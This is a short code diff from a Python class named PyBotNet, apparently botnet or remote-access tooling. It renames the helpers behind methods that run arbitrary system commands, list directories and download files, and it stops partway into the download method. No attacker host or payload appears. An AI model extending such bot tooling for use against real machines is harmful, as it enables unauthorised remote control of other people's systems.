@@ -120,11 +120,11 @@ class PyBotNet:
 
     def run_command_in_system(self, command: str) -> str:
         '''run system command in console and return data'''
-        return scripts.cmd(command, self.is_shell, self.logger)
+        return scripts.execute_cmd(command, self.is_shell, self.logger)
 
-    def run_ls(self, route: str) -> str:
+    def run_ls(self, path: str) -> str:
         '''return list of directory or files'''
-        return scripts.ls(route)
+        return scripts.ls(path)
 
     def download_file(self, download_link: str, file_name: str = False):
         if not file_name:
